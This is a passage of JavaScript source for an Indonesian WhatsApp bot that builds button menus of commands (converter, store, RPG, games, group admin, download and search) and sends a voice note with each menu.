{ "header": "Randommenu", "title": "List Random Menu", "id": ".randommenu"},
{ "header": "Randomquotes", "title": "List Random Quotes","id":".randomquotes"},
{ "header": "Cewekasiamenu", "title": "List CewekAsia Menu", "id": ".cewekasiamenu"},
{ "header": "Balancemenu", "title": "List Balance Menu", "id": ".balancemenu"},
{ "header": "Baileysmenu", "title": "List Baileys Menu", "id": ".baileysmenu" }, 
{ "header": "Ownermenu", "title": "List Owner Menu", "id": ".ownermenu" }, 
{ "header": "Storagemenu", "title": "List Storage Menu", "id": ".storagemenu"},
{ "header": "Randomstiker", "title": "List Random Stiker", "id": ".randomsticker" }, 
{ "header": "Stalkingmenu", "title": "List Stalking Menu", "id": ".stalkingmenu"}, 
{ "header": "ImageEffect", "title": "List ImageEffect", "id": ".imageeffect" },
{ "header": "Funmenu", "title": "List Fun Menu", "id": ".funmenu" }, 
{ "header": "Islammenu", "title": "List Islam Menu", "id": ".islammenu" }, 
{ "header": "banmenu", "title": "List Ban Menu", "id": ".banmenu" }, 
{ "header": "Unbanmenu", "title": "List Unban Menu", "id": ".unbanmenu" }, 
{ "header": "Bugmenu", "title": "List Bug Menu", "id": ".bugmenu" }, 
{ "header": "Textpromenu", "title": "List Textpromenu", "id": ".textpromenu" },
{ "header": "Photooxymenu", "title": "List Photooxymenu", "id": ".photooxymenu" }, 
{ "header": "Ephoto360menu", "title": "List Ephoto360menu", "id": ".ephoto360menu" }, 
{ "header": "Logomenu", "title": "List Logo Menu", "id": ".logomenu" }]}]}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Instagram Owner\",\"url\":\"${setting.instagram}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{ 
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Tiktok Owner\",\"url\":\"${setting.tiktok}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Grub Bot Wa\",\"url\":\"${setting.gcwa}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Donasi\",\"title\":\"Donasi\",\"id\":\".donasi\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await Aira.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
//console.log(setting.tiktok)



Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'mainmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await Aira.sendMessage(m.chat, {
text: mainMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'convertmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: convertMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await convertMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
  { "header": "Toanime", "title": "Fitur To Anime", "id": ".toanime" },
  { "header": "Tozombie", "title": "Fitur To Zombie", "id": ".tozombie" },
  { "header": "Toqr", "title": "Fitur To QR", "id": ".toqr" },
  { "header": "Differentme", "title": "Fitur Different Me", "id": ".differentme" },
  { "header": "Differentme2", "title": "Fitur Different Me 2", "id": ".differentme2" },
  { "header": "Diffusion", "title": "Fitur Diffusion", "id": ".diffusion" },
  { "header": "Txt2img", "title": "Fitur Text to Image", "id": ".txt2img" },
  { "header": "Aiscene", "title": "Fitur AI Scene", "id": ".aiscene" },
  { "header": "Remini", "title": "Fitur Remini", "id": ".remini" },
  { "header": "Hdr", "title": "Fitur HDR", "id": ".hdr" },
  { "header": "Nobg", "title": "Fitur No Background", "id": ".nobg" },
  { "header": "Removebg", "title": "Fitur Remove Background", "id": ".removebg" },
  { "header": "Resize", "title": "Fitur Resize", "id": ".resize" },
  { "header": "Setfps", "title": "Fitur Set FPS", "id": ".setfps" },
  { "header": "Ssweb", "title": "Fitur Screenshot Web", "id": ".ssweb" },
  { "header": "Ssweb2", "title": "Fitur Screenshot Web 2", "id": ".ssweb2" },
  { "header": "Gimage", "title": "Fitur Google Image", "id": ".gimage" },
  { "header": "Shortlink", "title": "Fitur Short Link", "id": ".shortlink" },
  { "header": "Sticker", "title": "Fitur Sticker", "id": ".sticker" },
  { "header": "Stickerwm", "title": "Fitur Sticker with Watermark", "id": ".stickerwm" },
  { "header": "Smeme", "title": "Fitur Meme", "id": ".smeme" },
  { "header": "Toimg", "title": "Fitur To Image", "id": ".toimg" },
  { "header": "Tourl", "title": "Fitur To URL", "id": ".tourl" },
  { "header": "Tovideo", "title": "Fitur To Video", "id": ".tovideo" },
  { "header": "Tomp3", "title": "Fitur To MP3", "id": ".tomp3" },
  { "header": "Toaudio", "title": "Fitur To Audio", "id": ".toaudio" },
  { "header": "Tovn", "title": "Fitur To VN", "id": ".tovn" },
  { "header": "Toptv", "title": "Fitur To PTV", "id": ".toptv" },
  { "header": "Readvo", "title": "Fitur Read Voice Over", "id": ".readvo" },
  { "header": "Ttp", "title": "Fitur TTP", "id": ".ttp" },
  { "header": "Attp", "title": "Fitur ATTP", "id": ".attp" },
  { "header": "Qc", "title": "Fitur QC", "id": ".qc" },
  { "header": "Emojimix", "title": "Fitur Emoji Mix", "id": ".emojimix" },
  { "header": "Ai", "title": "Fitur AI", "id": ".ai" },
  { "header": "Aiimg", "title": "Fitur AI Image", "id": ".aiimg" },
  { "header": "Aidraw", "title": "Fitur AI Draw", "id": ".aidraw" },
  { "header": "Simi", "title": "Fitur Simi", "id": ".simi" },
  { "header": "Scantext", "title": "Fitur Scan Text", "id": ".scantext" },
  { "header": "Scanai", "title": "Fitur Scan AI", "id": ".scanai" },
  { "header": "Ocr", "title": "Fitur OCR", "id": ".ocr" },
  { "header": "Ocrai", "title": "Fitur OCR AI", "id": ".ocrai" },
  { "header": "Nuliskiri", "title": "Fitur Tulis Kiri", "id": ".nuliskiri" },
  { "header": "Nuliskanan", "title": "Fitur Tulis Kanan", "id": ".nuliskanan" },
  { "header": "Foliokiri", "title": "Fitur Folio Kiri", "id": ".foliokiri" },
  { "header": "Foliokanan", "title": "Fitur Folio Kanan", "id": ".foliokanan" },
  { "header": "Say", "title": "Fitur Say", "id": ".say" },
  { "header": "Translate", "title": "Fitur Translate", "id": ".translate" }
]`
let namaMenu=`CONVERTER ♻️ & Ai MENU 🤖`
await sendButMenu(teksnya,json,namaMenu)
Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'anonymousmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: anonymousMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await anonymousMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
  { "header": "Anonymouschat", "title": "Fitur Anonymous Chat", "id": ".anonymouschat" },
  { "header": "Start", "title": "Fitur Start", "id": ".start" },
  { "header": "Next", "title": "Fitur Next", "id": ".next" },
  { "header": "Stop", "title": "Fitur Stop", "id": ".stop" },
  { "header": "Sendprofile", "title": "Fitur Send Profile", "id": ".sendprofile" },
  { "header": "Menfess", "title": "Fitur Menfess", "id": ".menfess" },
  { "header": "Confess", "title": "Fitur Confess", "id": ".confess" },
  { "header": "terimamenfess", "title": "Fitur Balas Menfess", "id": ".terimamenfess" },
  { "header": "Tolakmenfess", "title": "Fitur Tolak Menfess", "id": ".tolakmenfess" },
  { "header": "Stopmenfess", "title": "Fitur Stop Menfess", "id": ".stopmenfess" }
]
`
let namaMenu=`Anonymous Menu 🕵
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'storemenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: storeMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await storeMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "List", "title": "Fitur list", "id": ".list" },
    { "header": "Addlist", "title": "Fitur addlist", "id": ".addlist" },
    { "header": "Dellist", "title": "Fitur dellist", "id": ".dellist" },
    { "header": "Update", "title": "Fitur update", "id": ".update" },
    { "header": "Jeda", "title": "Fitur jeda", "id": ".jeda" },
    { "header": "Tambah", "title": "Fitur tambah", "id": ".tambah" },
    { "header": "Kurang", "title": "Fitur kurang", "id": ".kurang" },
    { "header": "Kali", "title": "Fitur kali", "id": ".kali" },
    { "header": "Bagi", "title": "Fitur bagi", "id": ".bagi" },
    { "header": "Delsetdone", "title": "Fitur delsetdone", "id": ".delsetdone" },
    { "header": "Changedone", "title": "Fitur changedone", "id": ".changedone" },
    { "header": "Setdone", "title": "Fitur setdone", "id": ".setdone" },
    { "header": "Delsetproses", "title": "Fitur delsetproses", "id": ".delsetproses" },
    { "header": "Changeproses", "title": "Fitur changeproses", "id": ".changeproses" },
    { "header": "Setproses", "title": "Fitur setproses", "id": ".setproses" },
    { "header": "Proses", "title": "Fitur proses", "id": ".proses" },
    { "header": "Done", "title": "Fitur done", "id": ".done" }
]
`
let namaMenu=`Store Menu 🛍
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'panelmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: panelMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await panelMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Panel", "title": "Fitur panel", "id": ".panel" },
    { "header": "Listusr", "title": "Fitur listusr", "id": ".listusr" },
    { "header": "Listsrv", "title": "Fitur listsrv", "id": ".listsrv" },
    { "header": "Addusr", "title": "Fitur addusr", "id": ".addusr" },
    { "header": "Delusr", "title": "Fitur delusr", "id": ".delusr" },
    { "header": "Addsrv", "title": "Fitur addsrv", "id": ".addsrv" },
    { "header": "Delsrv", "title": "Fitur delsrv", "id": ".delsrv" },
    { "header": "Updatesrv", "title": "Fitur updatesrv", "id": ".updatesrv" },
    { "header": "Suspend", "title": "Fitur suspend", "id": ".suspend *id*" },
    { "header": "Unsuspend", "title": "Fitur unsuspend", "id": ".unsuspend *id*" },
    { "header": "Createadmin", "title": "Fitur createadmin", "id": ".createadmin" },
    { "header": "Listadmin", "title": "Fitur listadmin", "id": ".listadmin" }
]
`
let namaMenu=`Panel Menu 🌐
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'resellermenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: resellerMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await resellerMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "1gb", "title": "Fitur 1gb", "id": ".1gb" },
    { "header": "2gb", "title": "Fitur 2gb", "id": ".2gb" },
    { "header": "3gb", "title": "Fitur 3gb", "id": ".3gb" },
    { "header": "4gb", "title": "Fitur 4gb", "id": ".4gb" },
    { "header": "5gb", "title": "Fitur 5gb", "id": ".5gb" },
    { "header": "6gb", "title": "Fitur 6gb", "id": ".6gb" },
    { "header": "7gb", "title": "Fitur 7gb", "id": ".7gb" },
    { "header": "8gb", "title": "Fitur 8gb", "id": ".8gb" },
    { "header": "Unli", "title": "Fitur unli", "id": ".unli" }
]
`
let namaMenu=`Reseller Menu 💻
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'rpgmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: rpgMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await rpgMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Inventory", "title": "Fitur inventory", "id": ".inventory" },
    { "header": "Mining", "title": "Fitur mining", "id": ".mining" },
    { "header": "Buy", "title": "Fitur buy", "id": ".buy" },
    { "header": "Sell", "title": "Fitur sell", "id": ".sell" },
    { "header": "Heal", "title": "Fitur heal", "id": ".heal" },
    { "header": "Hunt", "title": "Fitur hunt", "id": ".hunt" },
    { "header": "Adventure", "title": "Fitur adventure", "id": ".adventure" },
    { "header": "Luckyday", "title": "Fitur luckyday", "id": ".luckyday" },
    { "header": "Killslime", "title": "Fitur killslime", "id": ".killslime" },
    { "header": "Killgoblin", "title": "Fitur killgoblin", "id": ".killgoblin" },
    { "header": "Killdevil", "title": "Fitur killdevil", "id": ".killdevil" },
    { "header": "Killbehemoth", "title": "Fitur killbehemoth", "id": ".killbehemoth" },
    { "header": "Killdemon", "title": "Fitur killdemon", "id": ".killdemon" },
    { "header": "Killdemonking", "title": "Fitur killdemonking", "id": ".killdemonking" },
    { "header": "Joinrpg", "title": "Fitur joinrpg", "id": ".joinrpg" },
    { "header": "Sellikan", "title": "Fitur sellikan", "id": ".sellikan" },
    { "header": "Sellbesi", "title": "Fitur sellbesi", "id": ".sellbesi" },
    { "header": "Sellemas", "title": "Fitur sellemas", "id": ".sellemas" },
    { "header": "Jelajah", "title": "Fitur jelajah", "id": ".jelajah" },
    { "header": "Mancing", "title": "Fitur mancing", "id": ".mancing" },
    { "header": "Jualikan", "title": "Fitur jualikan", "id": ".jualikan" },
    { "header": "Jualcoal", "title": "Fitur jualcoal", "id": ".jualcoal" },
    { "header": "Jualstone", "title": "Fitur jualstone", "id": ".jualstone" },
    { "header": "Jualingot", "title": "Fitur jualingot", "id": ".jualingot" },
    { "header": "Jualkayu", "title": "Fitur jualkayu", "id": ".jualkayu" },
    { "header": "Jualbahankimia", "title": "Fitur jualbahankimia", "id": ".jualbahankimia" },
    { "header": "Lebur", "title": "Fitur lebur", "id": ".lebur" },
    { "header": "Nebang", "title": "Fitur nebang", "id": ".nebang" },
    { "header": "Goplanet", "title": "Fitur goplanet", "id": ".goplanet" },
    { "header": "Ngojek", "title": "Fitur ngojek", "id": ".ngojek" }
]
`
let namaMenu=`Rpg Menu ⚔️
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'gamemenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: gameMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await gameMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Caklontong", "title": "Fitur caklontong", "id": ".caklontong" },
    { "header": "Tebakgambar", "title": "Fitur tebakgambar", "id": ".tebakgambar" },
    { "header": "Tebakgame", "title": "Fitur tebakgame", "id": ".tebakgame" },
    { "header": "Tebakkata", "title": "Fitur tebakkata", "id": ".tebakkata" },
    { "header": "Tebakbendera", "title": "Fitur tebakbendera", "id": ".tebakbendera" },
    { "header": "Tebakkalimat", "title": "Fitur tebakkalimat", "id": ".tebakkalimat" },
    { "header": "Tebaksiapa", "title": "Fitur tebaksiapa", "id": ".tebaksiapa" },
    { "header": "Tebakkimia", "title": "Fitur tebakkimia", "id": ".tebakkimia" },
    { "header": "Tebaklirik", "title": "Fitur tebaklirik", "id": ".tebaklirik" },
    { "header": "Tebaktebakan", "title": "Fitur tebaktebakan", "id": ".tebaktebakan" },
    { "header": "Tekateki", "title": "Fitur tekateki", "id": ".tekateki" },
    { "header": "Family100", "title": "Fitur family100", "id": ".family100" },
    { "header": "Susunkata", "title": "Fitur susunkata", "id": ".susunkata" },
    { "header": "Tictactoe", "title": "Fitur tictactoe", "id": ".tictactoe" },
    { "header": "Delttt", "title": "Fitur delttt", "id": ".delttt" },
    { "header": "Casino", "title": "Fitur casino", "id": ".casino" },
    { "header": "Delcasino", "title": "Fitur delcasino", "id": ".delcasino" }
]
`
let namaMenu=`Game Menu 🎮
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'groupmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: groupMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await groupMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Autoaigc", "title": "Fitur autoaigc", "id": ".autoaigc" },
    { "header": "Afk", "title": "Fitur afk", "id": ".afk" },
    { "header": "Fitnah", "title": "Fitur fitnah", "id": ".fitnah" },
    { "header": "Intro", "title": "Fitur intro", "id": ".intro" },
    { "header": "Listonline", "title": "Fitur listonline", "id": ".listonline" },
    { "header": "Welcome", "title": "Fitur welcome", "id": ".welcome" },
    { "header": "Left", "title": "Fitur left", "id": ".left" },
    { "header": "Pppanjanggc", "title": "Fitur pppanjanggc", "id": ".pppanjanggc" },
    { "header": "Opentime", "title": "Fitur opentime", "id": ".opentime" },
    { "header": "Closetime", "title": "Fitur closetime", "id": ".closetime" },
    { "header": "Setopen", "title": "Fitur setopen", "id": ".setopen" },
    { "header": "Changesetopen", "title": "Fitur changesetopen", "id": ".changesetopen" },
    { "header": "Delsetopen", "title": "Fitur delsetopen", "id": ".delsetopen" },
    { "header": "Setclose", "title": "Fitur setclose", "id": ".setclose" },
    { "header": "Changesetclose", "title": "Fitur changesetclose", "id": ".changesetclose" },
    { "header": "Delsetclose", "title": "Fitur delsetclose", "id": ".delsetclose" },
    { "header": "Setwelcome", "title": "Fitur setwelcome", "id": ".setwelcome" },
    { "header": "Changewelcome", "title": "Fitur changewelcome", "id": ".changewelcome" },
    { "header": "Delsetwelcome", "title": "Fitur delsetwelcome", "id": ".delsetwelcome" },
    { "header": "Setleft", "title": "Fitur setleft", "id": ".setleft" },
    { "header": "Changeleft", "title": "Fitur changeleft", "id": ".changeleft" },
    { "header": "Delsetleft", "title": "Fitur delsetleft", "id": ".delsetleft" },
    { "header": "Linkgc", "title": "Fitur linkgc", "id": ".linkgc" },
    { "header": "Setppgc", "title": "Fitur setppgc", "id": ".setppgc" },
    { "header": "Setppgc2", "title": "Fitur setppgc2", "id": ".setppgc2" },
    { "header": "Setnamegc", "title": "Fitur setnamegc", "id": ".setnamegc" },
    { "header": "Setdesc", "title": "Fitur setdesc", "id": ".setdesc" },
    { "header": "Antilink", "title": "Fitur antilink", "id": ".antilink" },
    { "header": "Antilinktt", "title": "Fitur antilinktt", "id": ".antilinktt" },
    { "header": "Kickme", "title": "Fitur kickme", "id": ".kickme" },
    { "header": "Mute", "title": "Fitur mute", "id": ".mute" },
    { "header": "Open", "title": "Fitur open", "id": ".open" },
    { "header": "Close", "title": "Fitur close", "id": ".close" },
    { "header": "Add", "title": "Fitur add", "id": ".add" },
    { "header": "Kick", "title": "Fitur kick", "id": ".kick" },
    { "header": "Delete", "title": "Fitur delete", "id": ".delete" },
    { "header": "Promote", "title": "Fitur promote", "id": ".promote" },
    { "header": "Demote", "title": "Fitur demote", "id": ".demote" },
    { "header": "Revoke", "title": "Fitur revoke", "id": ".revoke" },
    { "header": "Hidetag", "title": "Fitur hidetag", "id": ".hidetag" },
    { "header": "Checksewa", "title": "Fitur checksewa", "id": ".checksewa" }
]
`
let namaMenu=`Group Menu 👥
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'downloadmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: downloadMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await downloadMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Play", "title": "Fitur play", "id": ".play" },
    { "header": "Ytmp3", "title": "Fitur ytmp3", "id": ".ytmp3" },
    { "header": "Ytmp4", "title": "Fitur ytmp4", "id": ".ytmp4" },
    { "header": "Ytv", "title": "Fitur ytv", "id": ".ytv" },
    { "header": "Ytv2", "title": "Fitur ytv2", "id": ".ytv2" },
    { "header": "Instagram", "title": "Fitur instagram", "id": ".instagram" },
    { "header": "Ig", "title": "Fitur ig", "id": ".ig" },
    { "header": "Ig2", "title": "Fitur ig2", "id": ".ig2" },
    { "header": "Ig3", "title": "Fitur ig3", "id": ".ig3" },
    { "header": "Igphoto", "title": "Fitur igphoto", "id": ".igphoto" },
    { "header": "Igvideo", "title": "Fitur igvideo", "id": ".igvideo" },
    { "header": "Igreels", "title": "Fitur igreels", "id": ".igreels" },
    { "header": "Twitter", "title": "Fitur twitter", "id": ".twitter" },
    { "header": "Tiktok", "title": "Fitur tiktok", "id": ".tiktok" },
    { "header": "Tiktoksearch", "title": "Fitur tiktoksearch", "id": ".tiktoksearch" },
    { "header": "Tiktokaudio", "title": "Fitur tiktokaudio", "id": ".tiktokaudio" },
    { "header": "Mediafire", "title": "Fitur mediafire", "id": ".mediafire" },
    { "header": "Gitclone", "title": "Fitur gitclone", "id": ".gitclone" },
    { "header": "Fbdl", "title": "Fitur fbdl", "id": ".fbdl" },
    { "header": "Fb2", "title": "Fitur fb2", "id": ".fb2" },
    { "header": "Fb3", "title": "Fitur fb3", "id": ".fb3" },
    { "header": "Fb4", "title": "Fitur fb4", "id": ".fb4" },
    { "header": "Gdrive", "title": "Fitur gdrive", "id": ".gdrive" }
]
`
let namaMenu=`Download Menu  📥
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'searchmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: searchMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await searchMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Lk21", "title": "Fitur lk21", "id": ".lk21" },
    { "header": "Jarak", "title": "Fitur jarak", "id": ".jarak" },
    { "header": "Google", "title": "Fitur google", "id": ".google" },
    { "header": "Googleimage", "title": "Fitur googleimage", "id": ".googleimage" },
    { "header": "Ytsearch", "title": "Fitur ytsearch", "id": ".ytsearch" },
    { "header": "Searchgrup", "title": "Fitur searchgrup", "id": ".searchgrup" },
    { "header": "Pinterest", "title": "Fitur pinterest", "id": ".pinterest" },
    { "header": "Lirik", "title": "Fitur lirik", "id": ".lirik" },
    { "header": "Shazam", "title": "Fitur shazam", "id": ".shazam" },
    { "header": "Carijudullagu", "title": "Fitur carijudullagu", "id": ".carijudullagu" },
    { "header": "Infogempa", "title": "Fitur infogempa", "id": ".infogempa" },
    { "header": "Infocuaca", "title": "Fitur infocuaca", "id": ".infocuaca" },
    { "header": "Komikusearch", "title": "Fitur komikusearch", "id": ".komikusearch" }
]
`
let namaMenu=`Search Menu 🔍
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'randommenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: randomMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await randomMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
